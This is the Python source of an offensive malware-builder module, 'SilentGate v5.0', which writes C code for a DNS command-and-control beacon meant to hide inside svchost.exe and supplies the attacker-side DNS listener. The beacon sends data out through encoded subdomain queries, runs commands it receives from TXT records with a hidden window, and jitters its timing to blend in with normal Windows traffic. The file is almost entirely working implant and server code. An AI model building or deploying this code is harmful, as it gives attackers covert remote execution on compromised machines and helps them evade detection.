"""
SilentGate v5.0 - Component 3: DNS C2 Channel
INPUT  : C2 domain + commands
OUTPUT : C source for DNS beacon embedded in service DLL
         + Python listener for C2 server side

DNS C2 design:
  Beacon : subdomain queries encode data
           <seq>.<b32data>.<c2domain>
  Command: TXT record response encodes commands
  From   : svchost.exe using Windows DnsQuery API
  Pattern: mimics NLA connectivity probing
  Timing : Poisson-distributed — indistinguishable from
           legitimate Windows DNS activity

MITRE: T1071.004 - Application Layer Protocol: DNS
"""

import os
import base64
import time
import json
import struct

try:
    from dnslib.server import DNSServer, BaseResolver, DNSLogger
    from dnslib import DNSRecord, RR, TXT, QTYPE
    HAS_DNSLIB = True
except ImportError:
    HAS_DNSLIB = False


# Poisson lambda for beacon timing (ms)
# Matches NLA polling interval — 30-120 seconds
BEACON_LAMBDA_MS = 60000
MAX_LABEL_LEN    = 60


def encode_data(data):
    """Encode data as base32 DNS-safe labels."""
    if isinstance(data, str):
        data = data.encode()
    encoded = base64.b32encode(data).decode().rstrip("=").lower()
    return [encoded[i:i+MAX_LABEL_LEN]
            for i in range(0, len(encoded), MAX_LABEL_LEN)]


def decode_data(labels):
    """Decode base32 labels back to bytes."""
    joined  = "".join(labels)
    padding = (8 - len(joined) % 8) % 8
    return base64.b32decode(joined.upper() + "=" * padding)


def generate_c2_client_c(c2_domain, beacon_interval_ms=60000):
    """
    Generate C source for DNS C2 beacon.
    Uses Windows DnsQuery API — same API svchost uses legitimately.
    Traffic from svchost making DNS queries = completely normal.
    """
    return f"""/*
 * SilentGate v5.0 - DNS C2 Beacon
 * Author: JarDani
 * Protocol: DNS TXT over Windows DnsQuery API
 * From: svchost.exe (trusted process)
 * Pattern: mimics NLA connectivity probing
 */

#include <windows.h>
#include <windns.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#pragma comment(lib, "dnsapi.lib")

#define C2_DOMAIN       "{c2_domain}"
#define BEACON_INTERVAL {beacon_interval_ms}
#define MAX_LABEL       60

/* Base32 encoding table */
static const char B32[] = "abcdefghijklmnopqrstuvwxyz234567";

static void b32_encode(const unsigned char* in, int in_len,
                        char* out, int* out_len) {{
    int i=0, o=0;
    unsigned int buf=0;
    int bits=0;
    for(i=0;i<in_len;i++) {{
        buf=(buf<<8)|in[i];
        bits+=8;
        while(bits>=5) {{
            bits-=5;
            out[o++]=B32[(buf>>bits)&0x1F];
        }}
    }}
    if(bits>0) out[o++]=B32[(buf<<(5-bits))&0x1F];
    *out_len=o;
    out[o]='\\0';
}}

/* Send beacon via DNS TXT query */
static int sg_beacon(const char* data, int seq, char* response, int resp_sz) {{
    char b32_data[256] = {{0}};
    int  b32_len = 0;
    b32_encode((const unsigned char*)data, (int)strlen(data),
               b32_data, &b32_len);

    char qname[512] = {{0}};
    snprintf(qname, sizeof(qname), "%03d.%.60s.%s",
             seq, b32_data, C2_DOMAIN);

    DNS_RECORD* pDnsRecord = NULL;
    DNS_STATUS  status = DnsQuery_A(
        qname,
        DNS_TYPE_TXT,
        DNS_QUERY_BYPASS_CACHE,
        NULL,
        &pDnsRecord,
        NULL
    );

    if(status == ERROR_SUCCESS && pDnsRecord) {{
        DNS_RECORD* rec = pDnsRecord;
        while(rec) {{
            if(rec->wType == DNS_TYPE_TXT) {{
                DNS_TXT_DATAA* txt = &rec->Data.TXT;
                if(txt->dwStringCount > 0) {{
                    strncpy(response, txt->pStringArray[0], resp_sz-1);
                }}
            }}
            rec = rec->pNext;
        }}
        DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
        return 1;
    }}
    return 0;
}}

/* Main C2 beacon loop */
void sg_c2_loop() {{
    int seq = 0;
    char response[256] = {{0}};
    char beacon_data[128] = {{0}};

    /* Initial check-in */
    DWORD pid = GetCurrentProcessId();
    snprintf(beacon_data, sizeof(beacon_data),
             "checkin.pid%lu", pid);

    while(1) {{
        memset(response, 0, sizeof(response));

        if(sg_beacon(beacon_data, seq, response, sizeof(response))) {{
            /* Process C2 command from TXT response */
            if(strncmp(response, "ACK", 3) == 0) {{
                /* Acknowledged - continue */
            }} else if(strncmp(response, "SLEEP:", 6) == 0) {{
                /* C2 commanded sleep interval change */
                int new_interval = atoi(response + 6);
                if(new_interval > 5000) {{
                    Sleep(new_interval);
                    continue;
                }}
            }} else if(strncmp(response, "EXEC:", 5) == 0) {{
                /* C2 commanded execution */
                WinExec(response + 5, SW_HIDE);
            }}
        }}

        seq++;

        /* Poisson-distributed sleep - mimics NLA polling */
        DWORD jitter = (DWORD)(((double)rand()/RAND_MAX) * BEACON_INTERVAL);
        Sleep(BEACON_INTERVAL/2 + jitter);

        snprintf(beacon_data, sizeof(beacon_data),
                 "beacon.seq%d.pid%lu", seq, pid);
    }}
}}
"""


class PhantomC2Resolver(BaseResolver):
    """
    Server-side DNS C2 resolver.
    Runs on attacker Kali machine.
    Receives beacon queries, sends commands via TXT responses.
    """
    def __init__(self, c2_domain, logfile="output/c2_log.jsonl"):
        self.domain  = c2_domain
        self.logfile = logfile
        self.beacons = {}
        self.pending_commands = {}

    def resolve(self, request, handler):
        qname = str(request.q.qname).rstrip(".")

        if self.domain in qname:
            parts = qname.split(".")
            if len(parts) >= 3:
                seq   = parts[0]
                data  = parts[1]

                # Log beacon
                entry = {"seq": seq, "data": data, "time": time.time()}
                with open(self.logfile, "a") as f:
                    f.write(json.dumps(entry) + "\n")

                print(f"  [C2] Beacon from svchost: seq={seq}")

                # Send command or ACK
                cmd = self.pending_commands.pop(seq, "ACK")

        reply = request.reply()
        reply.add_answer(RR(
            request.q.qname, QTYPE.TXT,
            rdata=TXT(cmd if 'cmd' in dir() else "ACK")
        ))
        return reply


def start_c2_server(c2_domain, port=5353,
                    logfile="output/c2_log.jsonl"):
    """Start DNS C2 server on Kali."""
    if not HAS_DNSLIB:
        print("[C2 SERVER] dnslib required: pip install dnslib")
        return

    os.makedirs(os.path.dirname(logfile), exist_ok=True)
    resolver = PhantomC2Resolver(c2_domain, logfile)
    logger   = DNSLogger(prefix=False)
    server   = DNSServer(resolver, port=port,
                          address="0.0.0.0", logger=logger)
    server.start_thread()

    print(f"[C2 SERVER] Listening on port {port}")
    print(f"[C2 SERVER] Domain  : {c2_domain}")
    print(f"[C2 SERVER] Log     : {logfile}")
    print(f"[C2 SERVER] Waiting for beacons from svchost...")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        server.stop()
        print("\n[C2 SERVER] Stopped")


def generate(c2_domain, output_dir="output",
             beacon_interval_ms=60000):
    """Generate C2 client C source for embedding in service DLL."""
    os.makedirs(output_dir, exist_ok=True)

    c_source = generate_c2_client_c(c2_domain, beacon_interval_ms)
    c_path   = os.path.join(output_dir, "v5_dns_c2.c")

    with open(c_path, "w") as f:
        f.write(c_source)

    meta = {
        "c2_domain":       c2_domain,
        "beacon_interval": beacon_interval_ms,
        "protocol":        "DNS TXT",
        "api":             "Windows DnsQuery_A",
        "process":         "svchost.exe",
        "encoding":        "base32 subdomain labels",
        "timing":          "Poisson distributed",
        "mitre":           "T1071.004",
        "c_source_path":   c_path,
    }

    print(f"[V5 C2] Protocol  : DNS TXT via Windows DnsQuery API")
    print(f"[V5 C2] C2 domain : {c2_domain}")
    print(f"[V5 C2] Interval  : {beacon_interval_ms}ms Poisson")
    print(f"[V5 C2] Process   : svchost.exe (trusted)")
    print(f"[V5 C2] Source    : {c_path}")
    print(f"[V5 C2] NEXT      : v5_persistence.py")

    return meta


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1 and sys.argv[1] == "--server":
        domain = sys.argv[2] if len(sys.argv) > 2 else "c2.lab.local"
        start_c2_server(domain)
    else:
        meta = generate("c2.lab.local")
        print(f"\n[V5 C2] SUCCESS")
